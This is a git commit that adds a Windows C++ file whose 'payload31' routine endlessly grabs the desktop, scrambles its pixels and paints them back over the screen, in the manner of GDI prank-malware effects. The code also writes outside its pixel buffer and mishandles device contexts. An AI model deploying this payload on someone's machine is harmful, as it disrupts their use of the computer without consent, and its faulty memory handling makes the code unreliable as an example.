c7550ef02645721392adc97fd488594ecf899b96
pankoza <77279607+pankoza-pl@users.noreply.github.com>
2022-06-24 16:13:40 +0200

    Add files via upload

---
+++ mythlasshader.cpp
@@ -0,0 +1,40 @@
+#include <windows.h>
+#include <intrin.h>
+#include <cmath>
+DWORD xs;
+VOID SeedXorshift32(DWORD dwSeed) {
+xs = dwSeed;
+}
+DWORD xorshift32() {
+	xs ^= xs << 13;
+	xs ^= xs << 17;
+	xs ^= xs << 5;
+	return xs;
+}
+DWORD WINAPI payload31(LPVOID lpParam) {
+	int ticks = GetTickCount(), w = GetSystemMetrics(0), h = GetSystemMetrics(1);
+	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	for (int i = 0;; i++, i %= 3) {
+
+		HDC hdc = GetDC(0), hdcMem = CreateCompatibleDC(hdc);
+		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
+		SelectObject(hdcMem, hbm);
+		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
+		GetBitmapBits(hbm, w * h * 4, data);
+		int v = 0;BYTE bt = 0;
+		if ((GetTickCount() - ticks) > 60000) bt = rand() & 0xffffff;
+		for (int i = 0; w * h > i; i++) {
+			if (i % h == 0 && rand() % 100 == 0) v = rand() % 50;
+			((BYTE*)(data + i))[v ? 252 : 252] += ((BYTE*)(data + i))[i % 3] ^ bt;
+		}
+		SetBitmapBits(hbm, w * h * 4, data);
+		BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
+		DeleteObject(hbm); DeleteObject(hdcMem);
+		DeleteObject(hdc);
+	}
+}
+
+int main(){
+	HANDLE thread31 = CreateThread(0, 0, payload31, 0, 0, 0);
+	Sleep(-1);
+}
